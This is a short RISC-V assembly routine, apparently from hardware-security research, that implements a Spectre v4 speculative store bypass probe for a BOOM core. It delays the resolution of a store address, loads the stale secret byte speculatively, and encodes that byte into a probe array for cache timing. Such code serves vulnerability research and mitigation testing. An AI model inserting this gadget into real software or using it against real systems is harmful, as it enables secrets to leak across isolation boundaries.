  .text
  .align 4
  .globl boom_v4_store_bypass_probe
  .type boom_v4_store_bypass_probe, @function

# a0 = data byte address
# a1 = probe array
# a2 = old secret value
# a3 = overwrite value
#
# This follows the vusec SpectreV4/STL shape: compute the store address through
# a slow dependency chain, issue the store, then immediately load from the known
# alias. If the load issues before store-address resolution, it observes the old
# secret value and encodes it into the probe array.
boom_v4_store_bypass_probe:
  sb    a2, 0(a0)
  fence rw, rw

  mv    t2, a0
  li    t1, 6
  mul   t2, t2, t1
  div   t2, t2, t1
  mul   t2, t2, t1
  div   t2, t2, t1
  mul   t2, t2, t1
  div   t2, t2, t1

  sb    a3, 0(t2)
  lbu   t0, 0(a0)
  slli  t0, t0, 6
  add   t0, a1, t0
  lbu   t3, 0(t0)
  ret
